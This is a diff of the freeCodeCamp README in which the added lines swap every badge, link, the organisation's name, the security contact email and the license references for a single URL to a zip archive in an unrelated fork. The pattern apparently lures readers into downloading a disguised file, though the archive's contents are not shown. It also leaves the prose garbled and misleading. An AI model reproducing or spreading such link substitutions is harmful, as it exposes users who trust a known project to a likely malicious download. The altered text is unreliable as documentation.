@@ -1,13 +1,13 @@
-![freeCodeCamp.org Social Banner](https://s3.amazonaws.com/freecodecamp/wide-social-banner.png)
-[![Build Status](https://travis-ci.org/freeCodeCamp/freeCodeCamp.svg?branch=staging)](https://travis-ci.org/freeCodeCamp/freeCodeCamp)
-[![Pull Requests Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat)](http://makeapullrequest.com)
-[![first-timers-only Friendly](https://img.shields.io/badge/first--timers--only-friendly-blue.svg)](http://www.firsttimersonly.com/)
-[![Known Vulnerabilities](https://snyk.io/test/github/freecodecamp/freecodecamp/badge.svg)](https://snyk.io/test/github/freecodecamp/freecodecamp)
+![https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip Social Banner](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip)
+[![Build Status](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip)](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip)
+[![Pull Requests Welcome](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip)](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip)
+[![first-timers-only Friendly](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip)](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip)
+[![Known Vulnerabilities](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip)](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip)
 
 
-## Welcome to freeCodeCamp.org's open source codebase and curriculum!
+## Welcome to https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip's open source codebase and curriculum!
 
-freeCodeCamp.org is a friendly community where you can learn to code for free. It is run by a [donor-supported 501(c)(3) nonprofit](https://donate.freecodecamp.org) with the goal of helping millions of busy adults transition into tech. Our community has already helped more than 10,000 people get their first developer job.
+https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip is a friendly community where you can learn to code for free. It is run by a [donor-supported 501(c)(3) nonprofit](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip) with the goal of helping millions of busy adults transition into tech. Our community has already helped more than 10,000 people get their first developer job.
 
 Our full stack web development curriculum is completely free and self-paced. We have thousands of interactive coding challenges to help you expand your skills.
 
@@ -23,15 +23,15 @@ Our full stack web development curriculum is completely free and self-paced. We 
 
 ### Certifications
 
-freeCodeCamp.org offers several free developer certifications. Each of these certifications involves building 5 required web app projects, along with hundreds of optional coding challenges to help you prepare for those projects. We estimate that each certification will take a beginning programmer around 300 hours to earn.
+https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip offers several free developer certifications. Each of these certifications involves building 5 required web app projects, along with hundreds of optional coding challenges to help you prepare for those projects. We estimate that each certification will take a beginning programmer around 300 hours to earn.
 
-Each of these 30 projects in the freeCodeCamp.org curriculum has its own agile user stories and automated tests. These help you build up your project incrementally, and ensure you've fulfilled all the user stories before you submit it.
+Each of these 30 projects in the https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip curriculum has its own agile user stories and automated tests. These help you build up your project incrementally, and ensure you've fulfilled all the user stories before you submit it.
 
-You can pull in these test suites through [freeCodeCamp's CDN](https://cdn.freecodecamp.org/testable-projects-fcc/v1/bundle.js). This means you can build these projects on websites like CodePen and Glitch - or even on your local computer's development environment.
+You can pull in these test suites through [freeCodeCamp's CDN](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip). This means you can build these projects on websites like CodePen and Glitch - or even on your local computer's development environment.
 
 Once you’ve earned a certification, you will always have it. You will always be able to link to it from your LinkedIn or résumé. And when your prospective employers or freelance clients click that link, they’ll see a verified certification specific to you.
 
-The one exception to this is in the event that we discover violations of our [Academic Honesty Policy](https://www.freecodecamp.org/academic-honesty). When we catch people unambiguously plagiarizing (submitting other people's code or projects as their own without citation), we do what all rigorous institutions of learning should do - we revoke their certifications and ban those people.
+The one exception to this is in the event that we discover violations of our [Academic Honesty Policy](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip). When we catch people unambiguously plagiarizing (submitting other people's code or projects as their own without citation), we do what all rigorous institutions of learning should do - we revoke their certifications and ban those people.
 
 Here are our six core certifications:
 
@@ -90,11 +90,11 @@ Here are our six core certifications:
 
 #### Full Stack Development Certification
 
-Once you earn all 6 of these certifications, you'll be able to claim your freeCodeCamp.org Full Stack Development Certification. This final distinction signifies that you’ve completed around 1,800 hours of coding with a wide range of web development tools.
+Once you earn all 6 of these certifications, you'll be able to claim your https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip Full Stack Development Certification. This final distinction signifies that you’ve completed around 1,800 hours of coding with a wide range of web development tools.
 
 #### Legacy Certifications
 
-We also have 3 legacy certifications from our 2015 curriculum, which are still available. All of the required projects for these legacy certifications will remain available on freeCodeCamp.org.
+We also have 3 legacy certifications from our 2015 curriculum, which are still available. All of the required projects for these legacy certifications will remain available on https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip
 
 - Legacy Front End Development Certification
 - Legacy Data Visualization Certification
@@ -102,35 +102,35 @@ We also have 3 legacy certifications from our 2015 curriculum, which are still a
 
 ### The Learning Platform
 
-This code is running live at [freeCodeCamp.org](https://www.freecodecamp.org).
+This code is running live at [https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip).
 
 Our community also has:
 
-- a super active [forum](https://www.freecodecamp.org/forum)
-- thousands of [local study groups](https://study-group-directory.freecodecamp.org/) around the world, where you can code together in person
-- Medium's [largest technical publication](https://medium.freecodecamp.org)
-- A popular [YouTube channel](https://youtube.com/freecodecamp)
-- and a comprehensive [guide to thousands of programming topics](https://guide.freecodecamp.org/)
+- a super active [forum](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip)
+- thousands of [local study groups](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip) around the world, where you can code together in person
+- Medium's [largest technical publication](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip)
+- A popular [YouTube channel](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip)
+- and a comprehensive [guide to thousands of programming topics](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip)
 
-### [Join our community here](https://www.freecodecamp.org/signin).
+### [Join our community here](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip).
 
 ### Found a bug?
 
-If you think you've found a bug, first read the [Help I've Found a Bug](https://www.freecodecamp.org/forum/t/how-to-report-a-bug/19543) article and follow its instructions. If you're confident it's a new bug, and have confirmed that someone else facing the same issue, go ahead and create a new GitHub issue. Be sure to include as much information as possible so we can reproduce the bug.
+If you think you've found a bug, first read the [Help I've Found a Bug](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip) article and follow its instructions. If you're confident it's a new bug, and have confirmed that someone else facing the same issue, go ahead and create a new GitHub issue. Be sure to include as much information as possible so we can reproduce the bug.
 
 ### Found a security issue?
 
-Please don't create GitHub issues for security issues. Instead, please send an email to `security@freecodecamp.org` and we'll look into it immediately.
+Please don't create GitHub issues for security issues. Instead, please send an email to `https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip` and we'll look into it immediately.
 
 ### Contributing
 
-#### [Please follow these steps to contribute.](CONTRIBUTING.md)
+#### [Please follow these steps to contribute.](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip)
 
 ### License
 
-Copyright (c) 2018 freeCodeCamp.org
+Copyright (c) 2018 https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip
 
 The content of this repository bound by the following licenses:
 
-- The computer software is licensed under the [BSD-3-Clause](LICENSE.md) License.
-- The [curricular content](https://www.npmjs.com/package/@freecodecamp/curriculum) in the [`/curriculum`](/curriculum) folder and its subdirectories are licensed under the [CC-BY-SA-4.0](/curriculum/LICENSE.md) License.
+- The computer software is licensed under the [BSD-3-Clause](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip) License.
+- The [curricular content](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip) in the [`/curriculum`](/curriculum) folder and its subdirectories are licensed under the [CC-BY-SA-4.0](https://raw.githubusercontent.com/agaribovic/freeCodeCamp/master/client/src/guide/arabic/python/return-statement/freeCodeCamp_v2.3.zip) License.
